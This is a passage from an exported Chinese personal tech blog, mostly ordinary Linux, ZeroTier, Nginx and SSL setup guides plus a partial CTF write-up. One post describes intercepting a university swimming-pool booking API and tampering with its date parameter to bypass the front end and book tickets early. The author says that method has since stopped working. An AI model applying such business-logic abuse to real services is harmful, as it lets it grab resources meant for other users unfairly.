weixin\n```\n\n即可安装微信！体验上佳，只是没表情包、朋友圈，如下：\n\n![f287cf086cb37f26fe6ea8145fee0202](https://oss.fyz666.xyz/blogfiles/png/f287cf086cb37f26fe6ea8145fee0202.png)\n","tags":["Linux","Ubuntu"],"categories":["瞎捣鼓经历"]},{"title":"Ubuntu桌面系统下双击运行sh文件","url":"//blog/7767/","content":"\n在桌面系统的Ubuntu下，我们运行sh文件通常仍需要打开终端，然后敲一条命令才能运行，非常麻烦，很自然的想法就是是否可以像windows一样通过双击的方式，来运行一个sh文件。\n\n早一些版本的Ubuntu系统似乎是可以直接在文件系统里进行设置的，而我用的版本并没有该功能的直接设置界面（反正我没找到），因此需要安装一个软件：\n\n```bash\nsudo apt install dconf-editor\n```\n\n然后运行：\n\n```bash\ndconf-editor\n```\n\n依次选中以下选项：\n\n![](https://oss.fyz666.xyz/blogfiles/png/c88445e6c4820774af1088d98aa30c03.png)\n然后可以在Custom value中将'display'替换为'ask'。\n\n\n最后，右键sh文件选中Properties，在Permissions栏下勾选Allow executing file as program。如此，在双击sh文件的时候，便会对你进行询问：\n\n![image-7](https://oss.fyz666.xyz/blogfiles/png/0f6b7df83a8ab99a43002253939bad85.png)\n","tags":["Linux","Ubuntu"],"categories":["瞎捣鼓经历"]},{"title":"通过ZeroTier实现外网设备与局域网内所有设备互联","url":"//blog/7739/","content":"\n前一篇文章，我们已经可以通过为设备安装ZeroTier软件来接入虚拟局域网，以此实现P2P访问，但这种方案的问题在于，需要为每一台想接入的设备均安装ZeroTier软件并在控制台加入网络，非常不方便。\n\n其实我们只需要在局域网的出口设备——路由器上安装该软件，并进行一定的配置，就可以达到外网访问任意局域网设备的效果。\n\n![](https://oss.fyz666.xyz/blogfiles/png/27228078ae1c1e97360da4741bf60149.png)\n## 前置条件\n\n\n- 路由器系统：OpenWrt\n- 一个ZeroTier虚拟局域网ID\n- OpenWrt内网段（文中假设为192.168.0.0/24）与ZeroTier虚拟网段无冲突\n- 愿意捣鼓、无惧踩坑的你\n\n## OpenWRT端软件配置\n\n\n后文将默认你已经在OpenWrt上成功安装了ZeroTier客户端，否则请出门左转～\n\n\n首先，如果是自建planet，我们需要将planet文件放到ZeroTier的配置目录下，planet文件的生成方法见[此文](/blog/7728/)。如果是自建moon，则需要将moon文件放置到配置目录的moons.d目录下，本文假设配置目录为/etc/zerotier。需要注意的是，OpenWrt下某些版本的ZeroTier，行星服务器的配置文件名可能并不是planet，而是world。\n\n\n接下来，我们通过uci对zerotier服务进行配置：\n\n```shell\nmkdir -p /etc/zerotier/moons.d\n\nuci set zerotier.sample_config.enabled='1'\nuci set zerotier.sample_config.config_path='/etc/zerotier'\nuci commit zerotier\n```\n\n接下来，查看zerotier的配置文件（`cat /etc/config/zerotier`），不出意外的话，刚刚修改的参数已经填写到文件中了。然后重启路由器。\n\n\n设置网络的secret参数：\n\n```shell\nuci set zerotier.sample_config.secret=\"$(cat /var/lib/zerotier-one/identity.secret)\"\nuci commit zerotier\n```\n\n重启ZeroTier服务，并使用命令`zerotier-cli join`加入网络。稍等片刻，在网页端控制台中即可发现新设备的加入，进行授权。然后小等一会，回到路由器终端，执行以下命令检查状态：\n\n```shell\nzerotier-cli listnetworks\n```\n\n若一切正常，应该会显示加入的网络与分配到的虚拟IP地址。至此，OpenWrt客户端软件配置已完成，接下来我们需要配置一下路由与防火墙。\n\n\n## ZeroTier静态路由配置\n\n\n前往ZeroTier网页端，对虚拟网络进行管理，选择Routes，添加一条配置，其Targets为OpenWrt内网网段（例如：192.168.0.0/24），Gateway配置为ZeroTier分配给OpenWrt的IP地址。如此，静态路由配置完成。\n\n\n## OpenWrt网络配置\n\n\n首先执行`ifconfig`命令看一下ZeroTier分配给的接口名称，例如我这里是zt0。\n\n![](https://oss.fyz666.xyz/blogfiles/png/c3985387544f4c882669b530b1246a40.png)\n来到luci界面，依次选择Network->Interfaces，添加一条新的interface，命名为zerotier，将其物理端口绑定为前面的zt0，防火墙新建一条命名为zerotier：\n\n![](https://oss.fyz666.xyz/blogfiles/png/eeb197509742c3ad6498c35171f315f0.png)\n然后前往Network->Firewall，配置如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/d436a92bb50ee1606314aa5ef7433fdd.png)\n最后，在OpenWrt中执行下面命令：\n\n```shell\niptables -I FORWARD -i zt0 -j ACCEPT\niptables -I FORWARD -o zt0 -j ACCEPT\niptables -t nat -I POSTROUTING -o zt0 -j MASQUERADE\n```\n\n注意将zt0修改为ZeroTier为你分配的接口名称。\n\n\n经过上面这些配置，外网接入虚拟局域网的设备就可以与OpenWrt局域网内的所有设备互访了。在配置成功后，我们可以将防火墙的三条规则写入Custom Rules中，方便开机自动启用。\n","tags":["OpenWrt","计算机网络","ZeroTier"],"categories":["瞎捣鼓经历"]},{"title":"自建一个ZeroTier行星/卫星服务器","url":"//blog/7728/","content":"\nZeroTier是一款好用的P2P虚拟局域网开源软件，通过它可以实现外网到内网设备的访问。本文从服务端到客户端一条龙搭建一个简单的ZeroTier虚拟局域网，实现从外网对内网树莓派的访问。\n\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/d58ca8a14bf0ab51e468e73dff6a037f.png)\nZeroTier的优点有：\n\n\n- 非常容易配置，只要拿到虚拟网络的ID，就可以加入网络，并自动分配IP地址，对小白具有亲和力。\n- 虚拟网络内的设备端对端建立连接，不需要经过中转服务器，响应快，不受服务器带宽、流量限制。\n\n但其缺点也很明显，其官方的服务器位于国外，直连状态下容易打洞失败，这样第二条优点便无法体现。\n\n\n为了改善使用体验，我们可以通过搭建moon服务器进行加速，或者也可以直接建一个行星服务器（planet），来实现自己的ZeroTier服务。\n\n\n## 前置条件\n\n\n- 一台拥有公网IP的服务器\n- 服务器上有docker、docker-compose（因为我后面的操作就是通过docker的，非docker部署法请自行谷歌）\n\n## 服务端安装\n\n\n因为有大佬开源的docker镜像[keynetworks/ztncui](https://hub.docker.com/r/keynetworks/ztncui)，因此安装的过程比较方便，但该镜像默认只提供一个管理平台，若直接使用该镜像而不加以任何修改，则并不能提供planet、moon服务器的作用，那就相当于白搭了，没有任何的意义。修改过程来自于[此issue](https://github.com/Jonnyan404/zerotier-planet/issues/11)，本人只是在自己博客上记录一下以防忘记。\n\n\n### 修改docker-compose文件\n\n\n首先，新建一个文件夹，并创建docker-compose.yml文件。\n\n\n\n```bash\nmkdir zerotier-planet && cd zerotier-planet && vi docker-compose.yml\n```\n\n作为根服务器，需要对外开放9993的tcp与udp端口，因此需要在docker-compose文件里加上端口映射并打开服务器防火墙的9993端口（tcp/udp），同时，将MYADDR的值改为服务器的公网ip（不写或许也行）：\n\n\n\n```yaml\nversion: '2.0'\nservices:\n    ztncui:\n        container_name: ztncui\n        restart: always\n        environment:\n            # - MYADDR=公网地址(不填自动获取)\n            - MYADDR=x.x.x.x\n            - HTTP_PORT=3443\n            - HTTP_ALL_INTERFACES=yes\n            - ZTNCUI_PASSWD=password\n        ports:\n            - '3443:3443'\n            - '9993:9993'\n            - '9993:9993/udp'\n        volumes:\n            - './zerotier-one:/var/lib/zerotier-one'\n            - './ztncui/etc:/opt/key-networks/ztncui/etc'\n        image: keynetworks/ztncui\n\n```\n\n### 启动容器\n\n\n\n```bash\ndocker-compose up -d\ndocker exec -it ztncui bash  # 进入容器\n```\n\n### 生成moon文件\n\n\n\n```bash\ncd /var/lib/zerotier-one\n# 生成moon配置文件\nzerotier-idtool initmoon identity.public > moon.json\nchmod 777 moon.json\nvi moon.json\n```\n\n若容器内没有vim，可在宿主机编辑文件（宿主机上有容器内的路径挂载）。\n\n\n将`\"stableEndpoints\": [\"127.0.0.1/9993\"]`中的本地ip修改为公网ip。\n\n\n如果将服务器作为moon使用，则需要继续在容器内执行下面命令生成moon文件：\n\n\n\n```bash\nzerotier-idtool genmoon moon.json\nmkdir moons.d\ncp *.moon moons.d/\n```\n\n### 生成planet文件\n\n\n如果将服务器作为planet使用，则需要进行下面的步骤。\n\n\n回到容器外，下载[此可执行文件](https://github.com/kaaass/ZeroTierOne/releases/tag/mkmoonworld-1.0)，放置于moon.json相同路径下，执行命令：\n\n\n\n```bash\nchmod +x mkmoonworld-x86_64\n./mkmoonworld-x86_64 moon.json\nmv world.bin planet\n```\n\n即可生成planet文件，将此文件复制一份到容器内：\n\n\n\n```bash\ndocker cp planet ztncui:/var/lib/zerotier-one\n```\n\n重启容器，服务端配置完成。\n\n\n\n```bash\ndocker restart ztncui\n```\n\n## 配置虚拟网络\n\n\n打开服务器3443端口后，在浏览器访问http 3443端口即可进入网站。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/79f0bc00d67a5e8ce9bfd5fff36b890b.png)\n默认用户名和密码分别是：admin与password，在登录以后修改默认密码。\n\n\n然后选择Add network，为我们的虚拟网络随便取一个名。因为我用的是阿里云的服务器，因此取名为了aliyun-net。然后我们选择Easy setup，进行网段的配置：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/e8060886baabdf99342fdef1af7e2788.png)\n网段配置比较随意，怎么开心怎么配，但我认为使用一些不常用的网段会比较好，我这里配置了10.10.10.0/24网段。（然而10.10.10.0/24也并不算少见，例如我有一次连上朋友家WiFi以后发现无法通过ZeroTier访问实验室的服务器，搞了半天发现原来他们家WiFi内网网段居然也是10.10.10.0/24。。）\n\n\n如此一来，最基本的配置过程已经结束。接下来只需要下载客户端以接入我们的虚拟网络。\n\n\n## 客户端配置\n\n\nZeroTier在大部分操作系统上都有对应的客户端软件，非常方便，这里我在树莓派上安装，只需要一条命令：\n\n\n\n```bash\ncurl -s https://install.zerotier.com/ | sudo bash\n```\n\n安装完成后，我们将前面生成的planet文件放到树莓派的/var/lib/zerotier-one/目录下，替换原有的planet，并重启zerotier-one服务，执行命令`zerotier-cli listpeers`，如果列出的条目中只有一条ip为前面设置的服务器公网ip的planet，就意味着planet文件生效了，接下来可以执行下面命令加入虚拟网络：\n\n\n\n```bash\nsudo zerotier-cli join [network ID]\n```\n\n稍等片刻，我们可以在前面的服务端网站上发现一个新的member，为其勾选Authorized，即可让它加入虚拟网络，我们可以为其手动或自动分配一个IP地址。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/51bb03a982ecafb8cc899cb0953dc45b.png)\n如上图，在其他加入该网络的设备上，访问IP地址10.10.10.2即可访问到我的树莓派。后面文章将介绍如何通过在OpenWrt路由器上配置ZeroTier与防火墙规则以实现外网访问整个局域网。\n\n\n\n\n---\n\n当然，自建行星服务器也有缺陷，例如手机端的软件目前不支持自行导入planet文件（iOS系统上的ZeroTier软件甚至连moon文件都无法自行配置），如果有手机使用ZeroTier的需求，建议还是自建moon节点进行转发。\n\n\n## 将上述Planet服务器作为Moon的方法\n\n\n首先，我们不需要手动修改docker容器里的planet文件，也即不需要执行前面的这一步：\n\n\n\n```bash\ndocker cp planet ztncui:/var/lib/zerotier-one\n```\n\n如果执行过了，进入容器（或在本地挂载目录下）将planet文件删去，然后重启此docker容器。\n\n\n同理，客户端的zerotier配置目录下（Ubuntu下是/var/lib/zerotier-one/）不需要手动修改planet文件，如果修改了，则删去。然后，在客户端的zerotier配置目录下创建moons.d目录，并将前面生成的moon文件复制到里面。最后重启zerotier服务。\n\n\n在客户端终端执行\n\n\n\n```bash\nzerotier-cli listpeers\n```\n\n若能看到MOON节点，则表示配置成功。\n","tags":["Docker","计算机网络","ZeroTier"],"categories":["瞎捣鼓经历"]},{"title":"使用Nginx反向代理ShareLaTeX服务并配置SSL","url":"//blog/7689/","content":"\n前面已经为WordPress配置了反代，此文将给出Nginx反代ShareLaTeX的配置。\n\n首先，我们将ShareLaTeX的docker容器映射到一个宿主机上不常用的空闲端口（例如8080）。\n\n\n然后配置Nginx：\n\n```nginx\nserver{\n  listen 80;\n  listen 443 ssl;\n  server_name latex.fyz666.xyz;\n  index  index.php index.html index.htm;\n  ssl_certificate /etc/letsencrypt/live/blog.fyz666.xyz/fullchain.pem;\n  ssl_certificate_key /etc/letsencrypt/live/blog.fyz666.xyz/privkey.pem;\n  if ($scheme = http){\n    return 301 https://$host$request_uri;\n  }\n  location / {\n    proxy_pass http://127.0.0.1:8080/;\n    proxy_set_header Host $host;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header X-Powered-By the-internet;\n    add_header Content-Security-Policy upgrade-insecure-requests;\n    proxy_set_header Upgrade $http_upgrade;\n    proxy_set_header Connection \"upgrade\";\n  }\n}\n```\n\n上述配置将域名latex.fyz666.xyz反代到本地的8080端口，前面的基本配置与[上篇文章](/blog/7673/)别无二致。而`location`配置下有两条需要注意的配置字段：\n\n```nginx\nproxy_set_header Upgrade $http_upgrade;\nproxy_set_header Connection \"upgrade\";\n```\n\n这两条字段是用来配置Websocket协议的反代的。\n\n\n最开始我并未加上这两条配置，然后在打开Latex项目时，出现了以下error：\n\n![](https://oss.fyz666.xyz/blogfiles/png/6dcb6b6f9c32bc7a8947a3884b36609c.png)\n但在十多秒后，又能够正常打开项目，经研究，我发现是Websocket连接报了400。原因可见[这篇文章](https://echizen.github.io/tech/2018/10-21-nginx-websocket)。加上那两个配置字段后，反向代理终于正常工作了。\n","tags":["ShareLaTeX","Nginx","SSL","反向代理"],"categories":["瞎捣鼓经历"]},{"title":"使用Nginx反向代理WordPress并配置SSL","url":"//blog/7673/","content":"\n此举是为了将原先部署在443端口的WordPress网站使用反向代理的方式重新部署。部署反代的过程踩了不少的坑，主要还是因为WordPress作为动态博客框架所具有的特殊机制。（说起这个就要后悔当时为啥没搞个静态博客了）\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/c64f1527b90df9f425136a4211b8c40f.jpg)\n首先介绍一下环境，我的WordPress网站运行在docker容器下，由Apache服务启动，原先的配置是docker容器内的Apache配置了SSL证书，并将容器443端口映射至宿主机。\n\n\n为了在宿主机上用Nginx做反代，首先要对容器内的服务进行一些修改。两次SSL肯定是不划算的，因此首先要将容器内的Apache服务停用https，然后我们修改容器的端口绑定为`0.0.0.0:8000->80/tcp`（这个8000随便选一个宿主机的空闲端口即可，后面Nginx配置反代时会用到）。注意：这个时候WordPress数据库内站点的地址仍然是https的地址，为了站点的优雅，这里的地址不要改动。\n\n\n接下来，配置Nginx，首先要确保安装的Nginx支持SSL（可通过`nginx -V`查看是否有SSL相关的模块）。\n\n```nginx\nserver{\n  listen 80;\n  listen 443 ssl;\n  server_name blog.fyz666.xyz;\n  index  index.php index.html index.htm;\n  ssl_certificate /etc/letsencrypt/live/fyz666.xyz/fullchain.pem;\n  ssl_certificate_key /etc/letsencrypt/live/fyz666.xyz/privkey.pem;\n  if ($scheme = http){\n    return 301 https://$host$request_uri;\n  }\n  location / {\n    proxy_pass  http://127.0.0.1:8000/;\n    proxy_set_header Host $host:$server_port;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-Host $http_host;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header X-Powered-By the-internet;\n    add_header Content-Security-Policy upgrade-insecure-requests;\n  }\n}\n```\n\n以上配置是针对我自己的域名、网站服务情况。在运行该配置的Nginx前，需要确认80、443端口是空闲的。\n\n\n- 首先，声明监听的两个端口，其中443端口开启SSL。\n- 然后我们指定[前面](/blog/7669/)使用Let's Encrypt生成的SSL证书，对于Nginx，我们只需要fullchain与privkey两个文件。\n- 接下来做一个301跳转，将http跳转到https。\n- 最后的`location`配置，则是反向代理的核心。\n\n首先，我们的反向代理的是将整个站点反代到443端口的根路径，因此`location`指定为`/`。然后是在`proxy_pass`字段指定位于localhost上的8000端口（这个端口是前面docker容器在宿主机上的映射），接下来必不可少的一条配置是`proxy_set_header Host $host:$server_port;`而这里有一个小坑。\n\n\n如果我们代理的是个静态的Web网站，只需要这样即可：`proxy_set_header Host $host;`，但对于WordPress，我们必须带上`$server_port`进行转发。这是因为WordPress会将该地址与数据库内的站点地址进行比较，若不同，则会进行301跳转。这里若Nginx转发时不带上443这个端口，在反代后面的WordPress看来，转发至它的端口则是8000，与数据库内的443端口不一致，它会强制将访问转发到443端口，重新交给Nginx处理，而Nginx又会重新反代到8000端口，可见这样操作会引发无限的重定向！\n\n\n另一条重要的配置是`add_header Content-Security-Policy upgrade-insecure-requests;`它是为了让WordPress能访问到其静态文件。\n\n\n但仅仅配置了Nginx是不够的，因为WordPress自身并不支持反向代理，我们还需要修改一下WordPress的源代码。\n\n\n打开WordPress网站根路径下的`wp-config.php`文件，找到包含`ABSPATH`的这段代码，在它前面添加三行：\n\n```php\n//添加下面三行代码\nif ( ! empty( $_SERVER['HTTP_X_FORWARDED_HOST'] ) ) {\n    $_SERVER['HTTP_HOST'] = $_SERVER['HTTP_X_FORWARDED_HOST'];\n}\n/** Absolute path to the WordPress directory. */\nif ( ! defined( 'ABSPATH' ) ) {\n\tdefine( 'ABSPATH', __DIR__ . '/' );\n}\n```\n\n这样配置下来，反向代理的WordPress网站已经可以正常运作了。\n","tags":["WordPress","Nginx","SSL","反向代理"],"categories":["博客相关"]},{"title":"使用Let's Encrypt生成通配符证书","url":"//blog/7669/","content":"\n本站长期以来维护着多个Web服务，除了此博客外，还有一个部署在80端口的ShareLaTeX以及其他杂七杂八的网站，这些站点没有https，每次访问时还得手动输入`http://`以及端口号，感觉既不安全也不优雅。因此最近我想用反代优化一下服务器站点的URL分配。\n\n我所期望的结果是：\n\n\n- 将所有网站服务均反代到443端口。\n- 通过域名对服务进行区分。\n- 所有服务都开启SSL。\n\n那么不可避免地，我需要申请一张多域名的SSL证书（不然得各自申请证书，维护起来过于麻烦）。基于一劳永逸的考虑，这里我决定直接为通配符域名`*.fyz666.xyz`申请证书。\n\n\n各大平台出售的通配符证书都贼贵，但这种东西明明是可以免费的，何必花这个冤枉钱。Let's Encrypt早已支持通配符SSL证书的签发，而且十分方便。\n\n\n我的环境如下：\n\n\n阿里云的Ubuntu 18.04镜像服务器，运行了多个Web服务，每个Web服务都独立运行在一个docker容器中。\n\n\n接下来，我们安装Certbot：\n\n```bash\nsudo apt install certbot\n```\n\n安装完成后，准备用该程序来签发证书。运行certbot：\n\n```bash\nsudo certbot certonly --manual -d *.fyz666.xyz --preferred-challenges dns-01 --server https://acme-v02.api.letsencrypt.org/directory\n```\n\n在命令运行过程中会有一些交互，中途需要做一条txt解析以进行域名所有权的验证，签发下的证书会位于`/etc/letsencrypt/live`路径下。\n\n\n通配符域名证书的续签过程与申请一样，只能通过dns-01的方式进行，因此自动化续签通配符证书，主要就是实现自动化DNS解析，这一步我们只要拿到域名所在的DNS服务商提供的Access Key与Access Token即可。这里有位大佬已经写好了[脚本](https://github.com/ywdblog/certbot-letencrypt-wildcardcertificates-alydns-au)与配置方法，直接拿来用就行！\n\n\n拿到证书，接下来只要做反向代理就好了！反向代理的部署及踩坑过程会记录在后面的文章中。\n","tags":["SSL"],"categories":["瞎捣鼓经历"]},{"title":"中科大中区游泳馆购票脚本","url":"//blog/7656/","content":"\n{% note info %}\n\n鉴于游泳馆预约平台已经更换，本文所述方法已失效。\n\n{% endnote %}\n\n\n最近天气逐渐变热，同学们对中区游泳池的需求量越来越大，票一放出来，没多久就抢完了，没点手速还真抢不过。因此，我决定深入研究一下购票系统，看看能不能写个脚本。\n\n这回用到的软件还是Charles，配置方法见[前面的一篇文章](/blog/6435/)。下面直接开始抓包。\n\n\n将手机连上Chalres代理，登录购票系统，随便找一张票，选定日期，点击“提交订单”，进入了“订单详情”页面，等待几秒后，点击“我已阅读并同意此协议”，此时，Charles抓到了一条我们需要的数据包：\n\n![](https://oss.fyz666.xyz/blogfiles/png/07f9ade0c782d4962d035783ca7058ef.png)\n这是条Post请求，向`https://yuyue.ustc.edu.cn/client/easyserpClient/ticket/freeBuyTicket`发送了一个表单，表单内容为：\n\n\n| 参数 | 说明 |\n| --- | --- |\n| ticketInfo | 票务信息（包含id与价格） |\n| token | 一个疑似用于身份认证的字符串 |\n| shopNum | 经测试为常量 |\n| useDay | 日期（%Y-%m-%d） |\n\n经分析，表单参数ticketInfo中的tickedId的值与场次数相关，每天的第n场对应的ticketId为n+1（虽然不知道为什么要这么搞）。\n\n\n拿到接口，我立刻用Postman试了一下，发现这个接口除了token外，确实不需要其他任何身份信息。另外我还发现前面的所有其他数据包都是不必要的过场，只要调用上面这个接口，就可以直接购票。那么我们只要获取token就可以了。更重要的是，该token是一个由微信号唯一确定的固定值，不会过期，因此可以一劳永逸。\n\n\n然而，我发现这个token的获取并不容易。经我研究，它应该是和微信号绑定的，而非我们学校的身份认证系统，这是因为在登录身份认证系统之前，就已经抓到包含token的数据包了。最终通过token购得的票，会进入上一次使用该token进行登录的科大帐号下（感觉这种操作有点奇怪hhh）。\n\n![](https://oss.fyz666.xyz/blogfiles/png/06ceb8f7f147e88c152e465f03b01da4.png)\n\n这里我还没有登录科大身份认证系统，但已经在数据包中发现了我的token\n\n\n这里要获取token需要拿到一个临时code，而这个code，应该是通过wx.login拿到的。我没有搞过微信这套东西的逆向，因此暂时把这个问题搁置了。\n\n\n总之，只要拿到了自己的token，就可以长期为自己爬票了，多是一件美事啊！\n\n\n最后，我发现useDay这个参数可以随便改，这样我们就可以绕过前端，提前预约到任意日期的游泳票了，比如这样：\n\n![](https://oss.fyz666.xyz/blogfiles/png/54ad01093d2d346d28d1792810769b43.png)\n成功爬到一张5月30号的票（逃\n\n![](https://oss.fyz666.xyz/blogfiles/png/bc135bd24b2443efe06d78f0d7f8c232.png)\n有一说一，学校的系统仍需改进啊。\n","tags":["爬虫"],"categories":["瞎捣鼓经历"]},{"title":"一次Emergency Mode修复","url":"//blog/7640/","content":"\n今天重启了一下Ubuntu系统，再开机时进入了emergency mode。心态大崩。\n\n又重启了一下，则进入了GRUB界面，怀疑有错误的内核，因此我选了一下Advanced options for Ubuntu，然而发现并没有多余的内核。启动后仍然是emergency mode。于是，执行命令：\n\n```bash\njournalctl -xb | grep failed\n```\n\n发现一条这样的错误：\n\n```plaintext\nUnit boot-efi.mount has failed.\n```\n\n显然是efi分区挂载失败了导致没法正常启动。手动挂载：\n\n```bash\nmount /boot/efi\n```\n\n报错（大概长下面这样）：\n\n```plaintext\nFAT-fs(nvme0n1p1): IO charset iso8859-1 not found.\n```\n\n然后上Stack Overflow一搜，就找到了解决方法，执行下面命令即可：\n\n```bash\ndepmod\n```\n\n重启，问题解决！又可以愉快上网了！\n","tags":["Linux","Ubuntu"],"categories":["Debug"]},{"title":"Ubuntu系统设置IPv4优先","url":"//blog/7631/","content":"\n使用透明代理进行科学上网的时候，若你的计算机与目标网站均有IPv6地址，计算机可能会优先使用IPv6对目标网站进行访问，而我们的代理一般是IPv4的地址，此时就会发现代理失败了。\n\n对于Ubuntu系统，以下方法可以让系统优先使用IPv4地址。\n\n```bash\nsudo vi /etc/gai.conf\n```\n\n将上述打开文件以下内容取消注释（同时将最后的数字由10改成100）：\n\n```plaintext\nprecedence ::ffff:0:0/96  100\n```","tags":["Linux","计算机网络"],"categories":["瞎捣鼓经历"]},{"title":"PKU GeekGame 1st 部分题目Write-Up","url":"//blog/7311/","content":"\nHackergame结束后，我又参加了PKU举办的GeekGame，本以为在Hackergame发挥不错，可以在GeekGame混混名次。\n\n然而参赛后感觉难度太大了，全程被大佬们按在地上摩擦，一阶段完整解出的题只有五道，只拿了1000分，总排名仅为42；二阶段随着提示的放出，基本丧失了做题兴趣，也没有再怎么拿分了。\n\n{% link 本次比赛的官方存档,GitHub,https://github.com/PKU-GeekGame/geekgame-1st %}\n\n## →签到←\n\n\nHackergame的Web签到题做多了，导致拿到一个Misc的签到题有点不知所措，题目没有给任何描述，只有一个PDF文件：\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-1st/raw/master/problemset/attachment/prob01_lwzltdrojur150zq.zip)\n\n用Chrome浏览器打开这个PDF文件如下所示：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/f623a6dfe47cdd59fef9964e0bab1758.png)\n似乎说后面一串奇怪的字符就是flag的样子，但我完全没办法把这些字符和flag联系起来。\n\n\n研究了许久无果后，我无意间全选了一下PDF里面的内容，复制粘贴到一个空白文件中，发现了玄机：\n\n\n\n```plaintext\n1\nfa{aeAGetTm@ekaev!\nlgHv__ra_ieGeGm_1}\n```\n\n看上去除了第一排混进来一个没什么用的\"1\"以外，后面两排可以组合成flag。再研究一下，发现就是个栅栏密码，交替取上下两排的字符，即可还原出flag。\n\n\nflag{Have_A_Great_Time@GeekGame_v1}\n\n\n\n说起来顺利做出这题还得感谢我平时一直用Chrome看PDF的习惯，一些使用常规PDF阅读器的选手都遇到了没办法选中超出界面的字符的问题。\n\n\n\n\n---\n\n## 小北问答Remake\n{% hideToggle 查看题面 %}\n{% note primary simple %}\nYou 酱善于使用十种搜索引擎，别人不清楚的知识她能一秒钟搜索出来。这是众人皆知的事实。\n\n\nYou 酱的朋友菜宝在刷往年题的时候找到了一份没有答案的资料。她本想询问 You 酱，但听说 You 酱已经早在 5 月份就把课程辅导这项业务外包给了你。\n\n\n于是，现在菜宝手持两枚 Flag，希望你能帮她解答这些题目。你每小时可以提交一次答案，答对至少一半可以获得第一个 Flag，全部答对可以获得第二个 Flag。\n\n{% endnote %}\n{% endhideToggle %}\n这题模仿了Hackergame的猫咪问答，但感觉难度高了不少，一共八个题，每做出四个可以拿一个flag，另外提交答案有1h的CD，直接送走了爆破选手（例如本人。题目如下：\n\n{% hideToggle 展开题目 %}\n{% note primary simple %}\n1. 北京大学燕园校区有理科 1 号楼到理科 X 号楼，但没有理科 (X+1) 号及之后的楼。X 是？  \n答案格式`^\\d+$`\n2. 上一届（第零届）比赛的总注册人数有多少？  \n答案格式`^\\d+$`\n3. geekgame.pku.edu.cn 的 HTTPS 证书曾有一次忘记续期了，发生过期的时间是？  \n答案格式`^2021-\\d\\d-\\d\\dT\\d\\d:\\d\\d:\\d3\\+08:00$`\n4. 2020 年 DEFCON CTF 资格赛签到题的 flag 是？  \n答案格式`^.+{.+}$`\n5. 在大小为 672328094 \\* 386900246 的方形棋盘上放 3 枚（相同的）皇后且它们互不攻击，有几种方法？  \n答案格式`^\\d+$`\n6. 上一届（第零届）比赛的“小北问答1202”题目会把所有选手提交的答案存到 SQLite 数据库的一个表中，这个表名叫？  \n答案格式`^[a-z]+$`\n7. 国际互联网由许多个自治系统（AS）组成。北京大学有一个自己的自治系统，它的编号是？  \n答案格式`^AS\\d+$`\n8. 截止到 2021 年 6 月 1 日，完全由北京大学信息科学技术学院下属的中文名称最长的实验室叫？  \n答案格式`^.{15,30}(实验室|中心)$`\n{% endnote %}\n{% endhideToggle %}\n我的解题方法（其中用到的搜索引擎均为Google）：\n\n\n1. 依次搜索\"北京大学燕园校区理科X号楼\"（$X \\in \\mathbb{N}^+$），搜到$X=6$时，没搜出来相关结果，因此这题应该是5。\n2. 搜索\"北京大学信息安全综合能力竞赛闭幕\"，搜到[链接](https://news.pku.edu.cn/xwzh/203d197d93c245a1aec23626bb43d464.htm)，里面写了注册人数为407。\n3. 这题是我最后搜出来的，最开始的反应：这种信息能去哪搜啊？后来经过漫长的搜索，得知有Google有一个证书透明化的项目，打开[此链接](https://transparencyreport.google.com/https/certificates)，在里面搜索\"geekgame.pku.edu.cn\"，拿到一堆历史证书： ![](https://oss.fyz666.xyz/blogfiles/png/f5c6a753df113f19a14b732a664dd6ef.png)注意到只有最后那个Let's Encrypt的证书是已经过期了的（点进去一看在2021年7月11日过期），遗憾的是，报告中没有提供具体的时间，但回答这题需要精确到秒。思考片刻，我打开了浏览器开发者工具，抓了一下这个页面的包，抓到如下数据：![](https://oss.fyz666.xyz/blogfiles/png/6b728ff9628e2e8db26b62a34b819d39.png)顺利拿到日期数据的UNIX时间戳，不过这里单位是毫秒，看到秒数是3我就确信找到了正确答案，将其转成日期：`time.strftime(\"%Y-%m-%dT%H:%M:%S+08:00\", time.localtime(1625964593))`得到精确到秒的时间：2021-07-11T08:49:53+08:00。从[Rank 1大佬的题解](https://github.com/PKU-GeekGame/geekgame-1st/tree/master/writeups/players/%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0%E6%98%8E%E5%B9%B4%E5%8D%81%E6%9C%88%E4%BB%BD%E4%B8%AD%E7%A7%91%E5%A4%A7%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B)中发现[crt.sh](https://crt.sh/)这个网站，搜起来更容易。\n4. 这种正规的比赛肯定会有Github仓库，直接找到然后在里面查到2020年quals[签到题文件](https://github.com/o-o-overflow/dc2020q-scoreboard/blob/073915aa5e5786beadfd06fe4aef04e7f4f50804/scoreboard_frontend/public/challenge_files/8a40c3a2ec3ef13216c5b3fd45b6631f1ad5b42497eda1ba618518f80f46712d/welcome.txt)，即可发现flag：OOO{this_is_the_welcome_flag}\n5. 这一题最开始被我当成了算法题研究了一天，随后作罢，开始正经搜答案。这题对搜索的关键词要求挺高的，如果搜中文关键词，基本拿不到什么有用的结果，都是清一色的“八皇后”问题。而如果搜\"placing 3 quees on m \\* n board\"，则可以搜到以下文章：[A047659 - OEIS](https://oeis.org/A047659)，里面给了通项公式，代入m和n去算就好了，这里我用python一开始遇到了浮点数精度问题，后来用符号计算解决了问题。答案是2933523260166137923998409309647057493882806525577536。（算出这个通项的人真是又无聊又牛逼。\n6. 去GeekGame-0th的Github仓库查看，发现[答案](https://github.com/PKU-GeekGame/geekgame-0th/blob/main/src/choice/game/db.py#L33)。submits\n7. 这题如果不加限制去搜，很容易搜到一个答案：AS24349，它的全称是CERNET2 IX at Peking University，但我提交了一下发现不对，后来注意到题目问的是“北京大学**自己的**自治系统”，搜\"autonomous system number for peking university\"，第一个结果是[AS59201 Peking University details - 